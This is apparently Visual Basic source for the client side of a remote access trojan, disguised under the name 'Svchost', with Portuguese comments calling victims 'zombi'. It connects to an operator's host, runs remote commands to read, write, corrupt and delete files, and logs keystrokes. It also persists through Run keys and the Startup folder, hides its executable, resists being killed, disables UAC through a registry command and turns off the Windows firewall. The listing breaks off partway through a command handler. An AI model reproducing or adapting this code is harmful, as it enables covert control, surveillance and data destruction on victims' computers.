Imports System.IO
Imports System.Text
Imports System.Net 'net
Imports System.Net.Sockets 'net
Imports Microsoft.Win32 'add aranck do windows
Imports System.Globalization
Imports System.IO.Compression 'winrar compress e descompress
Imports Microsoft.VisualBasic.CompilerServices
Imports System.Runtime.InteropServices
Imports Microsoft.VisualBasic.Devices
Imports System.Collections.Generic
Imports System.Threading
Imports System.Diagnostics
Imports System.Windows
Imports System.Environment
Imports System.Drawing.Bitmap
Imports System.Drawing
Imports System.Drawing.Drawing2D
Imports System.Drawing.Imaging
Imports System.Drawing.Image
Imports System.Windows.Forms.TextBox
Imports System.Windows.Forms.Label
Imports System.Windows.Forms.Clipboard
Imports System.Drawing.Icon
Imports System.Net.NetworkInformation
Imports System.Runtime
Imports System.Windows.Forms.Form
Imports System.Windows.Forms
Imports System.Windows.Forms.MessageBox
Imports System.Net.Sockets.TcpListener
Imports Microsoft.SocketClient
Imports System.Net.Dns
Imports System.Runtime.Serialization.Formatters.Binary


'Coded By pjoao1578
'32 e 64 bits
'recomended net frameworck 2.0 ou 4.5
'not recomended --> Make single instance application
Public Class Svchost 'name
#Region "ordem inports"

    <DllImport("kernel32")>
    Public Shared Function SuspendThread(ByVal hThread As IntPtr) As UInteger 'suspendi e restore processu 
    End Function
    <DllImport("kernel32")>
    Public Shared Function ResumeThread(ByVal hThread As IntPtr) As UInteger 'suspendi e restore processu
    End Function
    <DllImport("kernel32")>
    Public Shared Function OpenThread(ByVal dwDesiredAccess As ThreadAccess, ByVal bInheritHandle As Boolean, ByVal dwThreadId As UInteger) As IntPtr 'suspendi e restore processu 
    End Function
    <DllImport("kernel32")>
    Public Shared Function CloseHandle(ByVal hHandle As IntPtr) As Boolean 'suspendi e restore processu
    End Function
    <DllImport("user32")>
    Public Shared Function ShowWindow(ByVal handle As IntPtr, ByVal nCmdShow As Integer) As Integer
    End Function
    <DllImport("user32")>
    Public Shared Function GetAsyncKeyState(ByVal vKey As Integer) As Integer
    End Function
    <DllImport("user32")>
    Public Shared Function FindWindow(className As String, windowText As String) As IntPtr
    End Function
    Public Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Integer, ByVal uParam As Integer, ByVal lpvParam As String, ByVal fuWinIni As Integer) As Integer 'SET AS KWALLPAPER
    Public Declare Function FindWindowEx Lib "user32" Alias "FindWindowExA" (ByVal hWnd1 As IntPtr, ByVal hWnd2 As IntPtr, ByVal lpsz1 As String, ByVal lpsz2 As String) As IntPtr

    Public WithEvents c As New SocketClient 'conect
    Private culture As String = CultureInfo.CurrentCulture.EnglishName
    Private country As String = culture.Substring(culture.IndexOf("("c) + 1, culture.LastIndexOf(")"c) - culture.IndexOf("("c) - 1)
    Const spl = "MicrosoftCorporationSvchost" 'senha da stub e cliente
    Public cap As New CRDP 'descktop
    Public add2, host, add, ID, metext As String 'textboxs/host ou ip e nome do aranque do windows e sleep e hide executavel e ID User e keylogger offine e nome do forme quando criado
    Public alaa(), text4, text1, text2, text3, text5, text6 As String 'textboxs/add porta e host ou ip e nome e add ao aranque do windows e sleep e ID User e nome do forme quando criado e add startup
    Public hidme As Boolean = False 'checkboxs
    Public addwindows As Boolean = False 'checkboxs
    Public keyloger As Boolean = False 'checkboxs
    Public addwindows2 As Boolean = False 'checkboxs
    Public Startup As Boolean = False 'checkboxs
    Public antikill As Boolean = False 'checkboxs
    Public UAC As Boolean = False 'checkboxs
    Public firewall As Boolean = False 'checkboxs
    Public porta As Integer 'porta
    Dim yy As String = "||" 'yy = "||" = senha
    Dim DL As String = "cmd.exe /k ping 0 & del " 'delete por cmd / 0 = 0 segundos
    Dim G As String = "ProcessSplit" 'senha process manager
    Dim pc As String = Environment.MachineName 'nome do pc     
    Dim user As String = Environment.UserName 'nome do user do pc
    Public Q As Object = New FileInfo(Application.ExecutablePath).Name 'add ao aranque do windows = copy name do .exe ex(server.exe)
    Public W As Object = New FileInfo(Application.ExecutablePath) 'add ao aranque do windows = name do exe ex(server) / delete server quando for desistalado
    Public XX As Object = Application.ExecutablePath '= executavel 'server.exe'
    Public FF As Object = AppWinStyle.Hide 'hide cmd
    Dim local As String = Reflection.Assembly.GetExecutingAssembly().Location 'local do server ex(c:windows\server.exe)
    Dim lin As String = My.Computer.Info.InstalledUICulture.ToString 'idioma do computer
    Dim windows1 As String = My.Computer.Info.OSFullName 'windows do computer
    Dim bypassuac As String = "C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f" 'pypass UAC/ Reque como admin
    Dim dateday As String = My.Computer.Clock.LocalTime 'date e day
    Public s, k, alab, TECLA As String 's= open past file k= registry manager/alab = get pass
    Dim vercion As String = "2.6" 'vercion
    Dim hiden As FileAttribute = FileAttribute.Hidden + FileAttribute.System + IO.FileAttributes.ReadOnly 'hide + system 
    Dim normal As FileAttribute = FileAttribute.Normal 'normal
    Dim ta As New Antikill 'anti kill server
    Dim st As New Threading.Thread(AddressOf ta.protect) 'anti kill server
    Private Const SW_HIDE As Integer = 0 'mostre e bara de tarefas e menu iniciar 
    Private Const SW_SHOW As Integer = 1 'hide e bara de tarefas e menu iniciar 
    Private Const MUESTRA As Integer = 1 'mostra desktop
    Private Const OCULTA As Integer = 0 'hide desktop
    Dim ESCRITORIO As IntPtr 'hede e show descktop
    Private Const SETDESKWALLPAPER As Integer = 20 'SET AS KWALLPAPER
    Private Const UPDATEINIFILE As Integer = &H1 'SET AS KWALLPAPER
#End Region

    Public Enum ThreadAccess As Integer 'suspendi e restore processu 
        TERMINATE = 1
        SUSPEND_RESUME = 2
        GET_CONTEXT = 8
        SET_CONTEXT = 16
        SET_INFORMATION = 32
        QUERY_INFORMATION = 64
        SET_THREAD_TOKEN = 128
        IMPERSONATE = 256
        DIRECT_IMPERSONATION = 512
    End Enum

    Private Sub Svchost_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing 'forme Closing = server clone
        If antikill Then
            Try
                Diagnostics.Process.Start(XX.Clone) 'pesistencia ao fechar o executavel ira clonar o executavel se for dado kill no processo
            Catch ex As Exception 'clean erros e clone server 
                ProjectData.SetProjectError(ex)
                Diagnostics.Process.Start(XX.Clone) 'clone server
                ProjectData.ClearProjectError()
            End Try
        End If
    End Sub

    Private Sub Svchost_FormClosed(sender As Object, e As FormClosedEventArgs) Handles Me.FormClosed 'forme closed = server clone
        If antikill Then
            Try
                Diagnostics.Process.Start(XX.Clone) 'pesistencia ao fechar o executavel ira clonar o executavel se for dado kill no processo
            Catch ex As Exception 'clean erros e clone server 
                ProjectData.SetProjectError(ex)
                Diagnostics.Process.Start(XX.Clone) 'clone server
                ProjectData.ClearProjectError()
            End Try
        End If
    End Sub

    Private Sub Svchost_Load(ByVal sender As Object, ByVal e As EventArgs) Handles MyBase.Load
        Try 'obrigatorio o try
            FileOpen(1, XX, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared) 'open server
            text1 = Space$(LOF(1)) 'host/ip
            text2 = Space$(LOF(1)) 'porta
            FileGet(1, text1) 'host/ip
            FileGet(1, text2) 'porta
            FileClose() 'close
            alaa = Split(text1, spl)
            add2 = alaa(1) 'sleep
            host = alaa(2) 'chama a stub pra botar o host  
            porta = alaa(3) 'chama a stub pra potar a porta 
            add = alaa(4)  'add aranque do windows 
            hidme = alaa(5) 'hide executavel
            addwindows = alaa(6) 'add chave ao aranque do windows em Local user
            ID = alaa(7) 'ID User
            keyloger = alaa(8) 'keylogger offine
            metext = alaa(9) 'nome do forme do server quando criado
            addwindows2 = alaa(10) 'add chave ao aranque do windows em Local Machine
            Startup = alaa(11) 'add server ao Startup
            antikill = alaa(12) 'anti kill server
            UAC = alaa(13) 'bipass uac/ reque como admin server
            firewall = alaa(14) 'desativar firewall
            System.Windows.Forms.Control.CheckForIllegalCrossThreadCalls = False 'opcional
            Me.FormBorderStyle = Windows.Forms.FormBorderStyle.None
            Me.ShowIcon = False 'hide icone 
            MyClass.Hide() 'hide class
            Windows.Forms.Cursor.Hide() 'hide cursor em forme
            MyBase.Hide()
            Me.Hide() 'hide
            Me.Visible = False 'hide
            Me.ShowInTaskbar = False 'hide
            Me.Text = Me.metext 'nome do forme do server qundo criado = metext
            Threading.Thread.Sleep(add2) 'sleep au executar/add2 = tempo
            alab = a.GT 'chamar a get password
            Dim t As System.Windows.Forms.Timer = Me.Timer1
            t.Interval = 2000 'tenpo
            t.Enabled = True
            t.Start() 'start conect
            t = Nothing
            c.Connect(host, porta) 'conect
        Catch ex As Exception 'clean erros
            ProjectData.SetProjectError(ex)
            ProjectData.EndApp() 'exit process
            ProjectData.ClearProjectError()
        End Try
        'Start Keylogger offine
        If keyloger Then 'CheckBox.checkd = start keylogger offine 
            Try
                Me.TextBox1.Clear()
                Me.TextBox2.Clear()
                TECLA = ""
                Dim t As System.Windows.Forms.Timer = Me.Timer3
                t.Interval = 100 'tenpo
                t.Enabled = True
                t.Start() 'start keylogger
            Catch ex As Exception
            End Try
        End If
        'add ao Startup
        If Startup Then
            Try
                IO.File.Copy(W.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\" & Q, True) 'auto copy pra To StartUp do windows
            Catch ex As Exception
                ProjectData.SetProjectError(ex)
                ProjectData.ClearProjectError()
            End Try
        End If
        'add chave ao aranque do windows
        If addwindows Then 'CheckBox.checkd = add chave ao aranque do windows
            Thread.Sleep(add2) 'sleep ao add a chave no aranque do windows pela primeira vez ao executar o server no pc do zombi
            Try
                Dim key As String = add ' nome que fica no aranque do windows = a add
                Dim regKey As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("software\microsoft\windows\currentversion\run", True)
                regKey.SetValue(key, XX, Microsoft.Win32.RegistryValueKind.String) : regKey.Close()
            Catch ex As Exception
                ProjectData.SetProjectError(ex)
                ProjectData.ClearProjectError()
            End Try
        End If
        'add chave ao aranque do windows
        If addwindows2 Then 'CheckBox.checkd = add chave ao aranque do windows
            Thread.Sleep(add2) 'sleep ao add a chave no aranque do windows pela primeira vez ao executar o server no pc do zombi
            Try
                Dim key As String = add 'nome que fica no aranque do windows = a add
                Dim regKey As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey("software\microsoft\windows\currentversion\run", True)
                regKey.SetValue(key, XX, Microsoft.Win32.RegistryValueKind.String) : regKey.Close()
            Catch ex As Exception
                ProjectData.SetProjectError(ex)
                ProjectData.ClearProjectError()
            End Try
        End If
        If antikill Then
            'anti kill server protection
            st.Start() 'start
        End If
        If UAC Then
            'by pass uac
            Try
                Shell("cmd.exe /c " & bypassuac & " & exit", FF)
                Threading.Thread.Sleep(3000)
                For Each RunningProcess In Diagnostics.Process.GetProcessesByName("cmd.exe")
                    RunningProcess.Kill()
                Next
            Catch ex As Exception
                For Each RunningProcess In Diagnostics.Process.GetProcessesByName("cmd.exe")
                    RunningProcess.Kill()
                Next
                ProjectData.SetProjectError(ex)
                ProjectData.ClearProjectError()
            End Try
        End If
        If firewall Then
            'sesative firewall do windows
            Try
                Const NET_FW_PROFILE2_DOMAIN As Integer = 1
                Const NET_FW_PROFILE2_PRIVATE As Integer = 2
                Const NET_FW_PROFILE2_PUBLIC As Integer = 4
                Dim fwPolicy2
                fwPolicy2 = CreateObject("HNetCfg.FwPolicy2")
                fwPolicy2.FirewallEnabled(NET_FW_PROFILE2_DOMAIN) = False
                fwPolicy2.FirewallEnabled(NET_FW_PROFILE2_PRIVATE) = False
                fwPolicy2.FirewallEnabled(NET_FW_PROFILE2_PUBLIC) = False
            Catch ex As Exception
                ProjectData.SetProjectError(ex)
                ProjectData.ClearProjectError()
            End Try
        End If
        Try 'server system
            IO.File.SetAttributes(XX, FileAttribute.System + IO.FileAttributes.ReadOnly)
        Catch ex As Exception
        End Try
        If hidme Then
            'hide executavel
            Try
                IO.File.SetAttributes(XX, hiden) 'hide executavel
            Catch ex As Exception
            End Try
            If Startup Then
                Try
                    IO.File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & Q, hiden)  'hide executavel
                Catch ex As Exception
                End Try
            End If
        End If
    End Sub

    'persistência no regedit no aranque do windows 
    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick 'interval 10000
        Me.Timer2.Interval = 10000
        'auto copy server pra startup
        If Startup Then
            Try
                IO.File.Copy(W.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\" & Q, True) 'auto copy pra To StartUp do windows
            Catch ex As Exception 'erro nao report
                ProjectData.SetProjectError(ex)
                ProjectData.ClearProjectError()
            End Try
        End If
        'add chave ao aranque do windows
        If addwindows Then 'CheckBox.checkd = add chave ao aranque do windows
            Try
                Dim key As String = add ' nome que fica no aranque do windows
                Dim regKey As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("software\microsoft\windows\currentversion\run", True)
                regKey.SetValue(key, XX, Microsoft.Win32.RegistryValueKind.String) : regKey.Close()
            Catch ex As Exception 'erro nao report
                ProjectData.SetProjectError(ex)
                ProjectData.ClearProjectError()
            End Try
        End If
        'add chave ao aranque do windows
        If addwindows2 Then 'CheckBox.checkd = add chave ao aranque do windows
            Try
                Dim key As String = add 'nome que fica no aranque do windows = a add
                Dim regKey As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey("software\microsoft\windows\currentversion\run", True)
                regKey.SetValue(key, XX, Microsoft.Win32.RegistryValueKind.String) : regKey.Close()
            Catch ex As Exception 'erro nao report
                ProjectData.SetProjectError(ex)
                ProjectData.ClearProjectError()
            End Try
        End If
        If hidme Then
            Try 'hide executavel CheckBox.checkd = hide executavel 
                IO.File.SetAttributes(XX, hiden) 'hide executavel
            Catch ex As Exception
            End Try
            If Startup Then
                Try
                    IO.File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & Q, hiden)  'hide executavel
                Catch ex As Exception
                    ProjectData.SetProjectError(ex)
                    ProjectData.ClearProjectError()
                End Try
            End If
        End If
    End Sub
    'processo normal
    Private Sub ResumeProcess(ByVal process As System.Diagnostics.Process)
        Try
            For Each t As ProcessThread In process.Threads
                Dim th As IntPtr
                th = OpenThread(ThreadAccess.SUSPEND_RESUME, False, t.Id)
                If th <> IntPtr.Zero Then
                    ResumeThread(th)
                    CloseHandle(th)
                End If
            Next
        Catch ex As Exception
            ProjectData.SetProjectError(ex)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    'suspendi processo
    Private Sub SuspendProcess(ByVal process As System.Diagnostics.Process)
        Try
            For Each t As ProcessThread In process.Threads
                Dim th As IntPtr
                th = OpenThread(ThreadAccess.SUSPEND_RESUME, False, t.Id)
                If th <> IntPtr.Zero Then
                    SuspendThread(th)
                    CloseHandle(th)
                End If
            Next
        Catch ex As Exception
            ProjectData.SetProjectError(ex)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub Timer1_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles Timer1.Tick 'interval 1000
        Try
            If (Not c.Statconnected()) Then
                c.Connect(host, porta)
            End If
        Catch ex As Exception
            ProjectData.SetProjectError(ex)
            ProjectData.ClearProjectError()
        End Try
    End Sub

#Region "conect"
    Private Sub Connected() Handles c.Connected
        Try
            Dim t As System.Windows.Forms.Timer = Me.Timer1
            t.Interval = 100
            t.Enabled = True
            t.Start()
            t = Nothing
        Catch ex As Exception
            ProjectData.SetProjectError(ex)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub Disconnected() Handles c.Disconnected
        Try
            Me.Timer1.Interval = 100
            Me.Timer1.Enabled = True
            Me.Timer1.Start()
            c.Connect(host, porta)
        Catch ex As Exception
            ProjectData.SetProjectError(ex)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    'data onde chama os codigos
    Private Sub data(ByVal b As Byte()) Handles c.Data
        Dim a As String() = Split(BS(b), yy) 'yy = "||" = senha
        Try
            Select Case a(0)
                Case "info" 'informasions do computer 
                    Dim computerBits = windows1 & "/" & bits() 'nome do pc e detection 32 ou 64 bits em computer do zombi
                    c.Send("info" & yy & ID & yy & pc & yy & user & yy & country & yy & lin & yy &
                    computerBits & yy & getanti() & yy & vercion & yy & RAM() & yy & FR()) 'id ip computer e user pais idioma windows antivirus e versao e Ram do computer e instal date e  webcam
                    'unistal server em pc
                Case "Uninstall"
                    Me.Timer2.Stop() 'stop pesistencia no registro do windows = create key no regedit stop
                    Me.Timer2.Enabled = False
                    Me.Label1.Text = ""
                    Me.TextBox1.Clear()
                    Me.TextBox2.Clear()
                    Try
                        IO.File.SetAttributes(XX, normal) 'Normal server
                    Catch ex As Exception
                    End Try
                    If addwindows Then 'CheckBox.checkd = delete chave do aranque do windows do server
                        Try
                            Dim regKey As Microsoft.Win32.RegistryKey
                            regKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True) 'local onde esta o key do registro = true = delete key do registro
                            regKey.DeleteValue(add, True) 'delete key do server criado para arancar com windows
                            regKey.Close() 'close key
                        Catch ex As Exception
                            ProjectData.SetProjectError(ex)
                            ProjectData.ClearProjectError()
                        End Try
                    End If
                    If addwindows2 Then 'CheckBox.checkd = delete chave do aranque do windows do server
                        Try
                            Dim regKey As Microsoft.Win32.RegistryKey
                            regKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True) 'local onde esta o key do registro = true = delete key do registro
                            regKey.DeleteValue(add, True) 'delete key do server criado para arancar com windows
                            regKey.Close() 'close key
                        Catch ex As Exception
                            ProjectData.SetProjectError(ex)
                            ProjectData.ClearProjectError()
                        End Try
                    End If
                    If hidme Then 'hide normal e delete server
                        Try
                            IO.File.SetAttributes(XX, IO.FileAttributes.Normal) 'Normal server
                        Catch ex As Exception
                        End Try
                        Try
                            IO.File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & Q, normal) 'normal server no startup
                        Catch ex As Exception
                        End Try
                    End If
                    Try 'normal server
                        IO.File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\" & Q, normal) 'Normal server
                    Catch ex As Exception
                    End Try
                    Try 'delete server
                        IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\" & Q) 'delete server em Startup apos desistalado
                    Catch ex As Exception
                    End Try
                    Try 'normal server
                        IO.File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\" & Q, normal) 'Normal server
                    Catch ex As Exception
                    End Try
                    Try 'delete server
                        IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\" & Q) 'delete server apos desistalado + hide cmd + exit cmd
                    Catch ex As Exception
                    End Try
                    Try 'normal server
                        IO.File.SetAttributes(IO.Path.GetTempPath & Q, normal) 'Normal server
                    Catch ex As Exception
                    End Try
                    Try 'delete server
                        IO.File.Delete(IO.Path.GetTempPath & Q)
                    Catch ex As Exception
                    End Try
                    Try 'normal server
                        IO.File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & Q, normal) 'Normal server
                    Catch ex As Exception
                    End Try
                    Try 'delete server
                        IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & Q)
                    Catch ex As Exception
                    End Try
                    If keyloger Then 'delete logs do keylogger
                        Me.TextBox1.Clear()
                        Me.TextBox2.Clear()
                        Timer3.Stop()
                        Timer3.Enabled = False
                    End If
                    Try 'auto delete server em computer ex (executavel server.exe) info (ajuda para que o executavel nao deixe rastros em computer de zombi)
                        Shell(DL & ChrW(34) & W.FullName & ChrW(34) & " & exit", FF) 'delete server apos desistalado + hide cmd + exit cmd
                    Catch ex As Exception
                    End Try
                    Try
                        ProjectData.EndApp() 'finalizar tudo depois que for tudo removido do pc do zombi
                    Catch ex As Exception
                        ProjectData.SetProjectError(ex)
                        ProjectData.EndApp()
                        ProjectData.ClearProjectError()
                    End Try
                    'restart server
                Case "restartserver"
                    Me.Label1.Text = ""
                    Me.TextBox1.Clear()
                    Me.TextBox2.Clear()
                    Timer3.Stop()
                    Timer3.Enabled = False
                    Try
                        IO.File.SetAttributes(XX, FileAttributes.Normal) 'Normal server
                    Catch ex As Exception
                    End Try
                    Try
                        Diagnostics.Process.Start(XX) 'restart server
                    Catch ex As Exception
                        ProjectData.SetProjectError(ex)
                        Process.Start(XX) 'restart server
                        ProjectData.EndApp()
                        ProjectData.ClearProjectError()
                        Try
                            IO.File.SetAttributes(XX, hiden) 'hide executavel
                        Catch eex As Exception
                        End Try
                    End Try
                    If hidme Then 'CheckBox.checkd = hide executavel 
                        IO.File.SetAttributes(XX, hiden) 'hide executavel
                        If Startup Then
                            Try
                                IO.File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & Q, hiden)  'hide executavel
                            Catch ex As Exception
                            End Try
                        End If
                    End If
                    Try
                        ProjectData.EndApp() 'finalizar o server q esta aberto
                    Catch ex As Exception
                        ProjectData.SetProjectError(ex)
                        Process.Start(XX) 'restart server
                        ProjectData.EndApp()
                        ProjectData.ClearProjectError()
                        Try
                            IO.File.SetAttributes(XX, hiden) 'hide executavel
                        Catch eex As Exception
                        End Try
                    End Try
                    'close server
                Case "closeserver"
                    Try
                        Me.Label1.Text = ""
                        Me.TextBox1.Clear()
                        Me.TextBox2.Clear()
                        Timer3.Stop()
                        Timer3.Enabled = False
                        Me.Timer2.Stop() 'stop pesistencia no registro do windows = create key no regedit stop
                        ProjectData.EndApp() 'finalizar tudo
                    Catch ex As Exception
                        ProjectData.SetProjectError(ex)
                        ProjectData.EndApp()
                        ProjectData.ClearProjectError()
                    End Try
                    'clonar servidor
                Case "cloneserver"
                    Try
                        Diagnostics.Process.Start(XX.Clone)
                    Catch ex As Exception
                        ProjectData.SetProjectError(ex)
                        Process.Start(XX.Clone)
                        ProjectData.ClearProjectError()
                    End Try
                    'open URL em zombi
                Case "openurl"
                    Try
                        Diagnostics.Process.Start(a(1)) 'start



                        c.Send("openurl!" & yy & "A URL Foi Aberta ") 'menssagem
                    Catch ex As Exception
                        ProjectData.SetProjectError(ex)
                        Try
                            c.Send("openurlErro!" & yy & "Erro ! A URL Esta Errada ") 'menssagem erro
                        Catch exx As Exception
                        End Try
                        ProjectData.ClearProjectError()
                    End Try
                    'start processo / process manager
                Case "openur2"
                    Try
                        Diagnostics.Process.Start(a(1)) 'start




                        c.Send("openur2!" & yy & "O Processo Foi Iniciado ") 'menssagem
                    Catch ex As Exception
                        ProjectData.SetProjectError(ex)
                        Try
                            c.Send("openur2Erro!" & yy & "Erro Nome Ou Caminho Errado ") 'menssagem erro
                        Catch exx As Exception
                        End Try
                        ProjectData.ClearProjectError()
                    End Try
                    'edit txt file manager
                Case "edittextfile"
                    Try
                        Dim R As New StreamReader(a(1))
                        Dim d As String
                        d = R.ReadToEnd
                        R.Close()
                        c.Send("edittextfile" & yy & a(1) & yy & d)
                    Catch ex As Exception
                    End Try
                    'save txt file manager
                Case "savetextfile"
                    Try
                        Dim C As New StreamWriter(a(1))
                        C.WriteLine(a(2))
                        C.Close()
                    Catch ex As Exception
                    End Try
                    'set as wallpaper file manager
                Case "setaswallpaper"
                    Try
                        SystemParametersInfo(SETDESKWALLPAPER, 0, a(1), UPDATEINIFILE) 'clea wallpaper
                    Catch ex As Exception
                        ProjectData.SetProjectError(ex)
                        ProjectData.ClearProjectError()
                    End Try
                    'show descktop
                Case "descktop+show"
                    Try
                        Me.ESCRITORIO = FindWindowEx(0, 0, "Progman", Nothing) '
                        ShowWindow(ESCRITORIO, MUESTRA)
                    Catch ex As Exception
                        ProjectData.SetProjectError(ex)
                        ProjectData.ClearProjectError()
                    End Try
                    'hehi descktop
                Case "descktop+hide"
                    Try
                        Me.ESCRITORIO = FindWindowEx(0, 0, "Progman", Nothing)
                        ShowWindow(ESCRITORIO, OCULTA)
                    Catch ex As Exception
                        ProjectData.SetProjectError(ex)
                        ProjectData.ClearProjectError()
                    End Try
                    'hide bara de tarefas
                Case "barrahide"
                    Try
                        OCULTABARRA()
                    Catch ex As Exception
                        ProjectData.SetProjectError(ex)
                        ProjectData.ClearProjectError()
                    End Try
                    'mostra bara de tarefas
                Case "barramostre"
                    Try
                        MUESTRABARRA()
                    Catch ex As Exception
                        ProjectData.SetProjectError(ex)
                        ProjectData.ClearProjectError()
                    End Try
                    'auto copy server para os destinos
                Case "autocopy+appdata"
                    If IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & Q) Then
                        Try
                            IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & Q)
                        Catch ex As Exception
                        End Try
                        Try
                            IO.File.Copy(XX, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & Q, True)
                        Catch ex As Exception
                        End Try
                    Else
                        Try
                            IO.File.Copy(XX, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & Q, True)
                        Catch ex As Exception
                        End Try
                    End If
                Case "autocopy+Desktop" 'auto copy server para destino
                    If IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\" & Q) Then
                        Try
                            IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\" & Q)
                        Catch ex As Exception
                        End Try
                        Try
                            IO.File.Copy(XX, Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\" & Q, True)
                        Catch ex As Exception
                        End Try
                    Else
                        Try
                            IO.File.Copy(XX, Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\" & Q, True)
                        Catch ex As Exception
                        End Try
                    End If
                Case "autocopy+startup" 'auto copy server para destino
                    If IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\" & Q) Then
                        Try
                            IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\" & Q)
                        Catch ex As Exception
                        End Try
                        Try
                            IO.File.Copy(XX, Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\" & Q, True)
                        Catch ex As Exception
                        End Try
                    Else
                        Try
                            IO.File.Copy(XX, Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\" & Q, True)
                        Catch ex As Exception
                        End Try
                    End If
                Case "autocopy+temp" 'auto copy server para destino
                    If IO.File.Exists(IO.Path.GetTempPath & Q) Then
                        Try
                            IO.File.Delete(IO.Path.GetTempPath & Q)
                        Catch ex As Exception
                        End Try
                        Try
                            IO.File.Copy(XX, IO.Path.GetTempPath & Q)
                        Catch ex As Exception
                        End Try
                    Else
                        Try
                            IO.File.Copy(XX, IO.Path.GetTempPath & Q)
                        Catch ex As Exception
                        End Try
                    End If
                    'file manager copy
                Case "copy"
                    Try
                        Select Case a(1)
                            Case "file"
                                Dim sourceFileName As String = (a(2) & a(4))
                                Dim destFileName As String = (a(3) & a(4))
                                IO.File.Copy(sourceFileName, destFileName)
                                Exit Select
                            Case "folder"
                                Dim sourceFileName As String = (a(2) & a(4))
                                Dim destFileName As String = (a(3) & a(4))
                                IO.File.Copy(sourceFileName, destFileName)
                                Exit Select
                        End Select
                    Catch exception21 As Exception
                        ProjectData.SetProjectError(exception21)
                        ProjectData.ClearProjectError()
                    End Try
                    'cole file manager cole
                Case "cole"
                    Try
                        Select Case a(1)
                            Case "file"
                                Dim str18 As String = (a(2) & a(4))
                                Dim str17 As String = (a(3) & a(4))
                                IO.File.Move(str18, str17)
                                Exit Select
                            Case "folder"
                                Dim sourceDirName As String = (a(2) & a(4))
                                Dim destDirName As String = (a(3) & a(4))
                                IO.Directory.Move(sourceDirName, destDirName)
                                Exit Select
                        End Select
                    Catch exception22 As Exception
                        ProjectData.SetProjectError(exception22)
                        ProjectData.ClearProjectError()
                    End Try
                    'txt msgbox send zombis 
                Case "txttext"
                    MessageBox.Show((a(1)), "Mensagem", MessageBoxButtons.OK, MessageBoxIcon.Information) 'butao ok
                    'txt sonido em computer de zombi
                Case "txttosend"
                    Dim SAPI = CreateObject("SAPI.Spvoice")
                    SAPI.speak(a(1))
                    'coromper arquivos file manager
                Case "corrupt"
                    Dim corruption As String = "0123QEWEzgxc☺☻▼)"
                    Dim R As New StreamReader(a(1))
                    Dim d As String
                    d = R.ReadToEnd
                    R.Close()
                    My.Computer.FileSystem.WriteAllText(a(1), corruption & d, False)
                Case "cmddelete"
                    Try 'normal arquivo
                        IO.File.SetAttributes(a(1), normal) 'Normal arquivo
                    Catch ex As Exception
                    End Try
                    Try 'delete past
                        Dim aspas As String = """"
                        Dim delcmd As String = "rmdir /s /q " & aspas & a(1) & aspas 'comando
                        Shell("cmd.exe /c " & delcmd & "& exit", FF)
                        If Shell(DL & ChrW(34) & a(1) & ChrW(34) & " & exit", FF) Then 'delete arquivo
                        End If
                        Try
                            c.Send("Delete!" & yy & "O Arquivo Ou A Pasta Foi Deletada ")
                        Catch ex As Exception
                        End Try
                    Catch ex As Exception
                        c.Send("DeleteErro!" & yy & "Erro O Arquivo Ou A Pasta Não Pode Ser Deletado ")
                    End Try
                    'add keys a txt / file manager
                Case "addkeys"
                    Try
                        Dim en As String = vbNewLine
                        Dim asp As String = """"
                        Dim e As String = "  "
                        Dim nu As String = "0123456789" + en
                        Dim mn As String = "qwertyuiopasdfghjklçzxcvbnm" + en
                        Dim m As String = "QWERTYUIOPASDFGHJKLÇZXCVBNM" + en
                        Dim keys As String = "!@#$%¨&*(☺☻♥♦♣♠§▬↨↑↓→←∟↔▲▼)_+=/?|\.+-*/,;:>•◘○◙♀♪♫☼►◄↕‼¶<^^~~]}[{``´´/////////////---->" + en
